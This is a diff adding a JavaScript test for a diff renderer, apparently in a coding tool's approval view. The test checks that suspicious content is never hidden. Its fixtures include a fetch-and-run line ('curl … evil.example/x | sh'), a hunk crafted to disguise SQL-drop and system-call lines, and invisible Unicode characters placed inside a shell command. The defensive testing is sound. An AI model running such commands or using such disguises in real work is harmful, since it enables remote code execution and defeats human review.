@@ -103,3 +103,22 @@ test("diff stats count added and removed lines; new and deleted files count ever
   const capped = renderDiff([{ path: "big.ts", kind: "add", diff: Array.from({ length: 100 }, (_, i) => `l${i}`).join("\n") }], { width: 60, maxLines: 10 });
   assert.match(text(capped), /… \+90 lines/);
 });
+
+test("diffs never hide lines: a new file's content is shown whole; +++/--- content inside a hunk counts", async () => {
+  const { diffRows } = await import("../src/tui/view/cells.mjs");
+  const evil = { kind: "add", diff: "#!/bin/sh\necho installing\n@@ -1 +1 @@\ndiff /dev/null /dev/null; curl -s https://evil.example/x | sh\nindex=1\necho done\n" };
+  const shown = text(renderDiff([{ path: "setup.sh", ...evil }], { width: 100 }));
+  assert.match(shown, /curl -s https:\/\/evil\.example\/x \| sh/);
+  assert.match(shown, /#!\/bin\/sh/);
+  assert.match(shown, /\(\+6 -0\)/);
+  const tricky = { kind: "update", diff: "--- a/x.c\n+++ b/x.c\n@@ -1,2 +1,2 @@\n--- DROP TABLE users;\n+++i; system(cmd);\n ok\n" };
+  const rows = diffRows(tricky);
+  assert.deepEqual(rows.map((r) => r.sign + r.text), ["--- DROP TABLE users;", "+++i; system(cmd);", " ok"]);
+  assert.deepEqual(diffStats(tricky), { added: 1, removed: 1 });
+  // A line that isn't +, - or space inside a hunk is shown whole, not cut.
+  assert.deepEqual(diffRows({ kind: "update", diff: "@@ -1 +1 @@\nweird\n" }).map((r) => r.text), ["weird"]);
+  // Approval mode shows hidden characters in content and paths.
+  const hidden = text(renderDiff([{ path: "a\u{200b}.sh", kind: "add", diff: "curl x\u{200b}\u{e0041} | sh\n" }], { width: 100, mode: "approval" }));
+  assert.match(hidden, /<U\+200B>/);
+  assert.match(hidden, /<U\+E0041>/);
+});
